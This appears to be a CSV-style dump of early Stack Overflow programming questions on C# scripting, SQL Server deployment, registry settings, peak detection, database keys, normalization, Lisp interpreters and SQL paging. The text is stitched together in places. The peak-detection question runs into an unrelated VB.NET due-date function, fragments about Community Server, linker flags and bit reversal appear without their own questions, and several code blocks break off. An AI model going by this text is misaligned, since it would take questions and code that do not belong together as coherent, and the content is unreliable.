260,91,49,Adding scripting functionality to .NET applications,"<p>I have a little game written in C#. It uses a database as back-end. It's 
a <a href=""http://en.wikipedia.org/wiki/Collectible_card_game"">trading card game</a>, and I wanted to implement the function of the cards as a script.</p>

<p>What I mean is that I essentially have an interface, <code>ICard</code>, which a card class implements (<code>public class Card056 : ICard</code>) and which contains function that are called by the game.</p>

<p>Now, to make the thing maintainable/moddable, I would like to have the class for each card as source code in the database and essentially compile it on first use. So when I have to add/change a card, I'll just add it to the database and tell my application to refresh, without needing any assembly deployment (especially since we would be talking about 1 assembly per card which means hundreds of assemblies).</p>

<p>Is that possible? Register a class from a source file and then instantiate it, etc.</p>

Cards[current].OnEnterPlay(ref currentGameState);

330,63,29,Should I use nested classes in this case?,"<p>I am working on a collection of classes used for video playback and recording.

<p>I just learned about the existence of nested classes in C++, and I'm curious to know what programmers think about using them. I am a little wary and not really sure what the benefits/drawbacks are, but they seem (according to the book I'm reading) to be used in cases such as mine.</p>

<p>The book suggests that in a scenario like mine, a good solution would be to nest the workhorse classes inside the interface class, so there are no separate files for classes the client is not meant to use, and to avoid any possible naming conflicts? I don't know about these justifications. Nested classes are a new concept to me. Just want to see what programmers think about the issue.</p>

580,91,21,Deploying SQL Server Databases from Test to Live,"<p>I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.
Now, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.</p>

<p>Would you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).</p>

<p>Or - given the lack of ""EXPLAIN CREATE TABLE"" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).</p>

<p>And lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.</p>

<p>Now, i hear a lot of great stuff about the <a href=""http://www.red-gate.com/products/index.htm"">Red Gate</a> products, but for hobby projects, the price is a bit steep.</p>

810,233,9,Visual Studio Setup Project - Per User Registry Settings,"<p>I'm trying to maintain a Setup Project in <code>Visual Studio 2003</code> (yes, it's a legacy application). The problem we have at the moment is that we need to write registry entries to <code>HKCU</code> for every user on the computer. They need to be in the <code>HKCU</code> rather than <code>HKLM</code> because they are the default user settings, and they do change per user. My feeling is that</p>

<ol>
<li>This isn't possible</li>
<li>This isn't something the installer should be doing, but something the application should be doing (after all what happens when a user profile is created after the install?).</li>
</ol>

<p>And, at the moment the project lists five registry root keys (<code>HKEY_CLASSES_ROOT, HKEY_CURRENT_USER</code>, <code>HKEY_LOCAL_MACHINE</code>, <code>HKEY_USERS</code>, and User/Machine Hive). I don't really know anything about the Users root key, and haven't seen User/Machine Hive. Can anyone enlighten me on what they are? Perhaps they could solve my problem above.</p>

3260,186,46,Peak detection of measured signal,"<p>We use a data acquisition card to take readings from a device that increases its signal to a peak and then falls back to near the original value. To find the peak value we currently search the array for the highest reading and use the index to determine the timing of the peak value which is used in our calculations.</p>

<p>This works well if the highest value is the peak we are looking for but if the device is not working correctly we can see a second peak which can be higher than the initial peak. We take 10 readings a second from 16 devices over a 90 second period.</p>

<p>My initial thoughts are to cycle through the readings checking to see if the previous and next points are less than the current to find a peak and construct an array of peaks. Maybe we should be looking at a average of a number of points either side of the current position to allow for noise in the system. Is this the best way to proceed or are there better techniques?</p>

<p>The hours to be added is called ""delay"". It could easily be a parameter to the function instead.</p>

<p>Please post any suggestions. [VB.NET Warning]</p>

<pre><code>Private Function GetDateRequired() As Date

    Dim endOfDay As Decimal = 12.0 + 5.0 ''// end of day, in hours
    Dim startOfDay As Decimal = 8.0      ''// start of day, in hours

<p><strong>Note</strong>: This will probably not work if delay is more than 9 hours long. It should never change from 3, through.</p>

The goal is find the date and time that you get as a result of adding several hours to the current time. This is used to determine a default value for a due date of a submission. I want to add 3 hours to the current time to get the due date time. However, I don't want due dates that go beyond 5pm on the current day. So, I tried to have the hours split between (today, up to 5pm) and (tomorrow, from 8am on), such that adding 3 hours to 4pm would give you 19am, because 1 hour is added to the end of today and 2 hours are added to the beginning of tomorrow.</p>

I pointed them to Telligent's Community Server and  we had a sales like meeting today to get the Marketing folks on board. 
My question is if anyone has had issues working with Community Server, skinning it and extending it?<br>
I wanted to explain a bit why I am thinking Community Server, the company is wanting multiple blogs with multiple authors.  I want to be out of the admin part of this as much as possible and didn't think there were too many engines that having multiple blogs didn't mean db work.  I also like the other functionality that Community Server provides and think the company will find it useful, particularly the media section as right now we have some really shotty way of dealing with whitepapers and stuff.</p>

<p>edit: We are actually using the Sitecore blog module for a single blog on our intranet (which is actually what the CMS is serving).  Some reasoning for why I don't like it for our public site are they are on different servers, it doesn't support multiple authors, there is no built in syndication, it is a little flimsy feeling to me from looking at the source and I personally think the other features of Community Server make its price tag worth it.</p>

5600,615,37,Tables with no Primary Key,"<p>I have several tables whose only unique data is a uniqueidentifier (a Guid) column. Because guids are non-sequential (and they're client-side generated so I can't use newsequentialid()), I have made a non-primary, non-clustered index on this ID field rather than giving the tables a clustered primary key.</p>

<p>I'm wondering what the performance implications are for this approach. I've seen some people suggest that tables should have an auto-incrementing (""identity"") int as a clustered primary key even if it doesn't have any meaning, as it means that the database engine itself can use that value to quickly look up a row instead of having to use a bookmark.</p>

<p>My database is merge-replicated across a bunch of servers, so I've shied away from identity int columns as they're a bit hairy to get right in replication.</p>

<p>What are your thoughts? Should tables have primary keys? Or is it ok to not have any clustered indexes if there are no sensible columns to index that way?</p>

6110,754,3,Normalizing a Table with Low Integrity,"<p>I've been handed a table with about 18000 rows. Each record describes the location of one customer. The issue is, that when the person created the table, they did not add a field for ""Company Name"", only ""Location Name,"" and one company can have many locations.</p>

<p>For example, here are some records that describe the same customer:</p>

<p><strong>Location Table</strong></p>

<pre><code> ID  Location_Name     
 1   TownShop#1        
 2   Town Shop - Loc 2 
 3   The Town Shop     
 4   TTS - Someplace   
 5   Town Shop,the 3   
 6   Toen Shop4

<p><strong>Location Table</strong></p>

<pre><code> ID  Company_ID   Location_Name     
 1   1            Town Shop#1       
 2   1            Town Shop - Loc 2

<p><strong>Company Table</strong></p>

<pre><code> Company_ID  Company_Name  
 1           The Town Shop 
</code></pre>

<p>There is no ""Company"" table, I will have to generate the Company Name list from the most descriptive or best Location Name that represents the multiple locations.</p>

<p>Currently I am thinking I need to generate a list of Location Names that are similar, and then and go through that list by hand.</p>

<p>Any suggestions on how I can approach this is appreciated.</p>

9240,1144,10,Interfaces on different logic layers,"<p>Say you have an application divided into 3-tiers: GUI, business logic, and data access. In your business logic layer you have described your business objects: getters, setters, accessors, and so on... you get the idea. The interface to the business logic layer guarantees safe usage of the business logic, so all the methods and accessors you call will validate input. </p>

<p>This great when you first write the UI code, because you have a neatly defined interface that you can trust.</p>

<p>But here comes the tricky part, when you start writing the data access layer, the interface to the business logic does not accommodate your needs. You need to have more accessors and getters to set fields which are/used to be hidden. Now you are forced to erode the interface of your business logic; now it is possible set fields from the UI layer, which the UI layer has no business setting. </p>

<p>Because of the changes needed for the data access layer, the interface to the business logic has eroded to the point where it is possible to even set the business logic with invalid data. Thus, the interface does not guarantee safe usage anymore.</p>

This means I have to specify all necessary libraries: VC runtime and MFC.</p>

<p>Other compiler options include ""/MD""</p>

<p>Next to that: I can't use the linker flag ""/FORCE:MULTIPLE"" and just add <em>everything</em>:<br />
I'm looking for a non-overlapping set of libraries.</p>

9650,1084,14,Lisp/Scheme interpreter without Emacs?,"<p><br />
I've been wanting to teach myself Lisp for a while.  However, all the interpreters of which I've heard involve some flavor of emacs.
Are there any command line interpreters, such that I could type this into the command line:</p>

<blockquote>
  <p>lispinterpret sourcefile.lisp</p>
</blockquote>

<p>just like I can run perl or python.</p>

<p>While I'd also like to become more familiar with Emacs (if only not to be frustrated when I work with somebody who uses Emacs), I'd rather decouple learning Emacs from learning Lisp.</p>

<p>Edit: I actually want to follow SICP which uses Scheme, so an answer about Scheme would be more useful.  I'm just not that familiar with the differences.</p>

<blockquote>
  <p>Write a program to reverse the ""ON"" bits in a given byte.</p>

<p>I only can think of a solution using C. </p>

<p>Asking here so you can show me how to do in a Non C way (if possible)</p>

10190,373,10,How to return a page of results from SQL?,"<p>Many applications have grids that display data from a database table one page at a time. Many of them also let the user pick the number of records per page, sort by any column, and navigate back and forth through the results.</p>

<p>What's a good algorithm to implement this pattern without bringing the entire table to the client and then filtering the data on the client. How do you bring just the records you want to display to the user?</p>

<p>Does LINQ simplify the solution?</p>
